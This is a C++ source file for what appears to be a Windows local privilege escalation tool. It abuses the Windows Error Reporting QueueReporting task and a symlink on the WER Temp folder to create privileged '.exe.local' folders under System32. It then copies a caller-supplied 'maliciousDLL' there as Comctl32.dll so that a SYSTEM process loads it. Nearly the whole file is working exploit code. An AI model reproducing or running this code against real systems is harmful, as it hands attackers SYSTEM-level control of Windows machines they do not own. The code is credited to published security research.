// This code has been developed by @gweeperx (a.k.a Dimopoulos Elias). 
// This code is heavily based on symboliclink testing tools from google's project zero 
// https://github.com/googleprojectzero/symboliclink-testing-tools
// The technique which is implemented here, has been described by @jonasLyk in the following url:
// https://secret.club/2020/04/23/directory-deletion-shell.html

#include "stdafx.h"
#include "D_WER.h"
#include <FileSymlink.h>
#include <iostream>
#include <algorithm>

#pragma warning(disable : 4996)
#define BUFSIZE 256

#define VISTA TEXT("Vista")
#define WIN7  TEXT("Windows 7")
#define Win2K8 TEXT("Windows Server 2008") 

D_WER::D_WER(const std::wstring target_folder)
{
	set_target_folder(target_folder);
}

const std::wstring D_WER::get_target_folder(void)
{
	return this->target_folder;
}

const bool D_WER::set_target_folder(const std::wstring target_folder)
{
	this->target_folder = target_folder;
	return true;
}

const bool D_WER::execute_WER(void)
{
    system("schtasks /Run /TN \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\" /I");
    return true;
}

const bool D_WER::create_target_folder(std::wstring target_folder)
{
    LPCWSTR baseobjdir = nullptr;
    bool permanent = true;
    FileSymlink WER(permanent);

    if (::PathFileExists(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\"))
    {
        std::wcout << L"[!] WER Folder exists. Delete it and try again." << "\n" << std::endl;
        std::wcout << L"[!] Aborting..." << "\n" << std::endl;
        return false;
    }

    this->execute_WER();
    
    Sleep(1000); //too fast too furious 

    if (::PathFileExists(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\") == false)
    {
        std::wcout << L"[!] WER Folder could not be created. Something went wrong..." << "\n" << std::endl;
        std::wcout << L"[!] Aborting..." << "\n" << std::endl;
        return false;
    }

    std::wcout << L"[+] WER Folder was created... again." << "\n" << std::endl;


    if (::PathFileExists(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\"))
    {
        if (::RemoveDirectory(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\") != 0)
        {
            std::wcout << L"[+] WER's Temp Folder was deleted." << "\n" << std::endl;
        }
        else {
            std::wcout << L"[!] WER's Temp Folder was not deleted. Ensure it's empty and try again." << "\n" << std::endl;
            std::wcout << L"[!] Aborting..." << "\n" << std::endl;
            return false;
        }
    }
    else {
        std::wcout << L"[+] WER's Temp Folder does not exist. This is strange, but let's give it a chance..." << "\n" << std::endl;
    }

    Sleep(1000); //too fast too furious 

    Wow64DisableWow64FsRedirection(nullptr);

    WER.CreateSymlink(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp", target_folder.c_str(), baseobjdir);
    this->execute_WER();

    Sleep(1000); //too fast too furious 

    if (::PathFileExists(target_folder.c_str()))
    {
        std::wcout << L"[+] Target Folder was created." << "\n" << std::endl;
        return true;
    }
    
    else
    {
        std::wcout << L"[!] Target Folder was NOT created. I have no idea why..." << "\n" << std::endl;
        return false;
    }
    
}

std::wstring D_WER::max_version_folder(std::vector<std::wstring> filenamesList)
{
    size_t  pos = 0;
    size_t  pos_none = 0;
    int     cnt = 0;
    std::vector<std::wstring> versionsList;
    unsigned int numberOfFile = 0;

    //for every file in filenamesList
    for (numberOfFile = 0; numberOfFile < filenamesList.size(); numberOfFile++)
    {
        std::wcout << "[+] Folder " << filenamesList[numberOfFile] << " was detected." << std::endl;

        //Find where the the version number begins. This is the position after the third "_" . Here we detect the position of the "_".
        while (cnt != 3)
        {
            pos += 1;
            pos = filenamesList[numberOfFile].find(L"_", pos);
            if (pos == std::string::npos)
                ;
            cnt++;
        }

        //Detect where the version number ends. It ends at the begining of the "_none_"
        pos_none = filenamesList[numberOfFile].find(L"_none_", pos_none);

        //Take the full version number. This is the substring which starts after the third "_" and ends at the begining of _none_. Put that substring in the "versionsList" vector. 

        versionsList.push_back(filenamesList[numberOfFile].substr(pos + 1, (pos_none - pos - 1)));
        pos_none = 0;
    }

    //Find max version

    std::wcout << "[+] Folder with max version: " << *std::max_element(versionsList.begin(), versionsList.end()) << std::endl;

    //find the folder which contains the Max version
    for (numberOfFile = 0; numberOfFile < filenamesList.size(); numberOfFile++)
    {
        pos = 0;
        pos = filenamesList[numberOfFile].find(*std::max_element(versionsList.begin(), versionsList.end()), pos);

        if (pos != std::string::npos) {
            break;
        }
    }

    std::wcout << "[+] The subfolder " << filenamesList[numberOfFile] << " will be used." << std::endl;

    return  filenamesList[numberOfFile];

}

std::vector<std::wstring> D_WER::searchFileFolder(LPCWSTR file_or_folder)
{
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind;
    DWORD dwError = 0;
    size_t  pos = 0;
    size_t  pos_none = 0;
    int     cnt = 0;
    std::vector<std::wstring> filenamesList;
    std::vector<std::wstring> versionsList;
    unsigned int numberOfFile = 0;


    hFind = FindFirstFile(file_or_folder, &FindFileData);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        std::wcout << "[!] FindFirstFile failed (\n" << GetLastError() << ")";
        return filenamesList;
    }

    //Create a vector with all the folders
    do
    {
        filenamesList.push_back(std::wstring(FindFileData.cFileName));

    } while (FindNextFile(hFind, &FindFileData) != 0);

    dwError = GetLastError();

    if (dwError != ERROR_NO_MORE_FILES)
    {
        std::wcout << "[!] FindFirstFile failed (\n" << GetLastError() << ")";
        return filenamesList;
    }

    FindClose(hFind);


    return filenamesList;


}

//GetOSDisplayString: code from: http://forum.codecall.net/topic/60159-how-to-determine-windows-operating-system-version-information-using-visual-c/

BOOL D_WER::GetOSDisplayString(PDWORD dwProductType)
{
    wchar_t pszOS[256];
    typedef void (WINAPI* PGETSYSTEMINFO)(LPSYSTEM_INFO);
    typedef BOOL(WINAPI* PGETPRODUCTINFO)(DWORD, DWORD, DWORD, DWORD, PDWORD);
    OSVERSIONINFOEX osvi;
    SYSTEM_INFO si;
    PGETSYSTEMINFO pGetSystemInfo;
    PGETPRODUCTINFO pGetProductInfo;
    BOOL bOsVersionInfoEx;
    DWORD dwType;

    ZeroMemory(&si, sizeof(SYSTEM_INFO));
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    if (!(bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi)))
        return 1;

    // Call GetNativeSystemInfo if supported or GetSystemInfo otherwise.

    pGetSystemInfo = (PGETSYSTEMINFO)GetProcAddress(
        GetModuleHandle(TEXT("kernel32.dll")),
        "GetNativeSystemInfo");
    if (NULL != pGetSystemInfo)
        pGetSystemInfo(&si);
    else GetSystemInfo(&si);

    if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId &&
        osvi.dwMajorVersion > 4)
    {
        StringCchCopy(pszOS, BUFSIZE, TEXT("Microsoft "));

        // Test for the specific product.

        if (osvi.dwMajorVersion == 6)
        {
            if (osvi.dwMinorVersion == 0)
            {
                if (osvi.wProductType == VER_NT_WORKSTATION)
                    StringCchCat(pszOS, BUFSIZE, TEXT("Windows Vista "));
                else StringCchCat(pszOS, BUFSIZE, TEXT("Windows Server 2008 "));
            }

            if (osvi.dwMinorVersion == 1)
            {
                if (osvi.wProductType == VER_NT_WORKSTATION)
                    StringCchCat(pszOS, BUFSIZE, TEXT("Windows 7 "));
                else StringCchCat(pszOS, BUFSIZE, TEXT("Windows Server 2008 R2 "));
            }

            pGetProductInfo = (PGETPRODUCTINFO)GetProcAddress(
                GetModuleHandle(TEXT("kernel32.dll")),
                "GetProductInfo");

            pGetProductInfo(osvi.dwMajorVersion, osvi.dwMinorVersion, 0, 0, &dwType);

            switch (dwType)
            {
            case PRODUCT_ULTIMATE:
                StringCchCat(pszOS, BUFSIZE, TEXT("Ultimate Edition"));
                break;
            case 0x00000030:
                StringCchCat(pszOS, BUFSIZE, TEXT("Professional"));
                break;
            case PRODUCT_HOME_PREMIUM:
                StringCchCat(pszOS, BUFSIZE, TEXT("Home Premium Edition"));
                break;
            case PRODUCT_HOME_BASIC:
                StringCchCat(pszOS, BUFSIZE, TEXT("Home Basic Edition"));
                break;
            case PRODUCT_ENTERPRISE:
                StringCchCat(pszOS, BUFSIZE, TEXT("Enterprise Edition"));
                break;
            case PRODUCT_BUSINESS:
                StringCchCat(pszOS, BUFSIZE, TEXT("Business Edition"));
                break;
            case PRODUCT_STARTER:
                StringCchCat(pszOS, BUFSIZE, TEXT("Starter Edition"));
                break;
            case PRODUCT_CLUSTER_SERVER:
                StringCchCat(pszOS, BUFSIZE, TEXT("Cluster Server Edition"));
                break;
            case PRODUCT_DATACENTER_SERVER:
                StringCchCat(pszOS, BUFSIZE, TEXT("Datacenter Edition"));
                break;
            case PRODUCT_DATACENTER_SERVER_CORE:
                StringCchCat(pszOS, BUFSIZE, TEXT("Datacenter Edition (core installation)"));
                break;
            case PRODUCT_ENTERPRISE_SERVER:
                StringCchCat(pszOS, BUFSIZE, TEXT("Enterprise Edition"));
                break;
            case PRODUCT_ENTERPRISE_SERVER_CORE:
                StringCchCat(pszOS, BUFSIZE, TEXT("Enterprise Edition (core installation)"));
                break;
            case PRODUCT_ENTERPRISE_SERVER_IA64:
                StringCchCat(pszOS, BUFSIZE, TEXT("Enterprise Edition for Itanium-based Systems"));
                break;
            case PRODUCT_SMALLBUSINESS_SERVER:
                StringCchCat(pszOS, BUFSIZE, TEXT("Small Business Server"));
                break;
            case PRODUCT_SMALLBUSINESS_SERVER_PREMIUM:
                StringCchCat(pszOS, BUFSIZE, TEXT("Small Business Server Premium Edition"));
                break;
            case PRODUCT_STANDARD_SERVER:
                StringCchCat(pszOS, BUFSIZE, TEXT("Standard Edition"));
                break;
            case PRODUCT_STANDARD_SERVER_CORE:
                StringCchCat(pszOS, BUFSIZE, TEXT("Standard Edition (core installation)"));
                break;
            case PRODUCT_WEB_SERVER:
                StringCchCat(pszOS, BUFSIZE, TEXT("Web Server Edition"));
                break;
            }
        }

        if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2)
        {
            if (GetSystemMetrics(SM_SERVERR2))
                StringCchCat(pszOS, BUFSIZE, TEXT("Windows Server 2003 R2, "));
            else if (osvi.wSuiteMask & VER_SUITE_STORAGE_SERVER)
                StringCchCat(pszOS, BUFSIZE, TEXT("Windows Storage Server 2003"));
            else if (osvi.wSuiteMask & 0x00008000)
                StringCchCat(pszOS, BUFSIZE, TEXT("Windows Home Server"));
            else if (osvi.wProductType == VER_NT_WORKSTATION &&
                si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
            {
                StringCchCat(pszOS, BUFSIZE, TEXT("Windows XP Professional x64 Edition"));
            }
            else StringCchCat(pszOS, BUFSIZE, TEXT("Windows Server 2003, "));

            // Test for the server type.
            if (osvi.wProductType != VER_NT_WORKSTATION)
            {
                if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
                {
                    if (osvi.wSuiteMask & VER_SUITE_DATACENTER)
                        StringCchCat(pszOS, BUFSIZE, TEXT("Datacenter Edition for Itanium-based Systems"));
                    else if (osvi.wSuiteMask & VER_SUITE_ENTERPRISE)
                        StringCchCat(pszOS, BUFSIZE, TEXT("Enterprise Edition for Itanium-based Systems"));
                }

                else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
                {
                    if (osvi.wSuiteMask & VER_SUITE_DATACENTER)
                        StringCchCat(pszOS, BUFSIZE, TEXT("Datacenter x64 Edition"));
                    else if (osvi.wSuiteMask & VER_SUITE_ENTERPRISE)
                        StringCchCat(pszOS, BUFSIZE, TEXT("Enterprise x64 Edition"));
                    else StringCchCat(pszOS, BUFSIZE, TEXT("Standard x64 Edition"));
                }

                else
                {
                    if (osvi.wSuiteMask & VER_SUITE_COMPUTE_SERVER)
                        StringCchCat(pszOS, BUFSIZE, TEXT("Compute Cluster Edition"));
                    else if (osvi.wSuiteMask & VER_SUITE_DATACENTER)
                        StringCchCat(pszOS, BUFSIZE, TEXT("Datacenter Edition"));
                    else if (osvi.wSuiteMask & VER_SUITE_ENTERPRISE)
                        StringCchCat(pszOS, BUFSIZE, TEXT("Enterprise Edition"));
                    else if (osvi.wSuiteMask & VER_SUITE_BLADE)
                        StringCchCat(pszOS, BUFSIZE, TEXT("Web Edition"));
                    else StringCchCat(pszOS, BUFSIZE, TEXT("Standard Edition"));
                }
            }
        }

        if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
        {
            StringCchCat(pszOS, BUFSIZE, TEXT("Windows XP "));
            if (osvi.wSuiteMask & VER_SUITE_PERSONAL)
                StringCchCat(pszOS, BUFSIZE, TEXT("Home Edition"));
            else StringCchCat(pszOS, BUFSIZE, TEXT("Professional"));
        }

        if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
        {
            StringCchCat(pszOS, BUFSIZE, TEXT("Windows 2000 "));

            if (osvi.wProductType == VER_NT_WORKSTATION)
            {
                StringCchCat(pszOS, BUFSIZE, TEXT("Professional"));
            }
            else
            {
                if (osvi.wSuiteMask & VER_SUITE_DATACENTER)
                    StringCchCat(pszOS, BUFSIZE, TEXT("Datacenter Server"));
                else if (osvi.wSuiteMask & VER_SUITE_ENTERPRISE)
                    StringCchCat(pszOS, BUFSIZE, TEXT("Advanced Server"));
                else StringCchCat(pszOS, BUFSIZE, TEXT("Server"));
            }
        }

        // Include service pack (if any) and build number.

        if (_tcslen(osvi.szCSDVersion) > 0)
        {
            StringCchCat(pszOS, BUFSIZE, TEXT(" "));
            StringCchCat(pszOS, BUFSIZE, osvi.szCSDVersion);
        }

        TCHAR buf[80];

        StringCchPrintf(buf, 80, TEXT(" (build %d) %d.%d \nService Pack Version Informration: %d.%d \nArch: "), osvi.dwBuildNumber, osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.wServicePackMajor, osvi.wServicePackMinor);
        StringCchCat(pszOS, BUFSIZE, buf);

        if (osvi.dwMajorVersion >= 6)
        {
            if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
                StringCchCat(pszOS, BUFSIZE, TEXT("64-bit\n"));
            else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
                StringCchCat(pszOS, BUFSIZE, TEXT("32-bit\n"));
        }

        _tprintf(_T("OS Version Information %s\n"), pszOS);
        *dwProductType = dwType;
        return TRUE;
    }

    else
    {
        printf("This sample does not support this version of Windows.\n");
        *dwProductType = dwType;
        return FALSE;
    }
   
}

const bool D_WER::escalateToSystem(std::wstring maliciousDLL, const std::wstring technique)
{
    Wow64DisableWow64FsRedirection(nullptr);

    DWORD pdwReturnedProductType = 0;
    bool result = false;
    std::wstring WerFolderW;
   
    if (technique.empty())
    {

        if (this->GetOSDisplayString(&pdwReturnedProductType) == false)
        {
            std::wcout << "[!] GetOSDisplayString failed. Aborting...;" << std::endl;
            return false;
        }


        if (pdwReturnedProductType == PRODUCT_CORE) //Windows 10 Home Trial
        {
            //Demonstrated by Jonas_L
            std::wcout << "[+] wermgr.exe.local will be used." << std::endl;
            WerFolderW.append(L"C:\\Windows\\System32\\wermgr.exe.local\\");
        }

        //gweeperx
        else
        {
            std::wcout << "[+] CompatTelRunner.exe.Local will be used." << std::endl;
            std::wcout << "[i] This technique takes a few moments to execute the DLL. Sometimes, a restart is needed." << std::endl;
            WerFolderW.append(L"C:\\Windows\\System32\\CompatTelRunner.exe.Local\\");
        }

    }

    else
    {
        std::wcout << "[+] "<< technique <<" will be used." << std::endl;
        std::wcout << "[i] You use a manual technique . G o o d - L u c k !" << std::endl;
        WerFolderW.assign(technique);
    }

    
    if (this->create_target_folder(WerFolderW) == false) {
        return false;
    }
    WerFolderW.append(this->max_version_folder(searchFileFolder(L"C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_*_none_*")));

    ::CreateDirectory(WerFolderW.c_str(), nullptr);

    std::wcout << "[+] Folder " << WerFolderW << "was created." << std::endl;

    WerFolderW.append(L"\\Comctl32.dll");

    ::CopyFile(maliciousDLL.c_str(), WerFolderW.c_str(), result);

    std::wcout << "[+] DLL " << maliciousDLL << " was copied to ." << WerFolderW << std::endl;

    Sleep(1000);

    this->execute_WER();
    
    return result;

}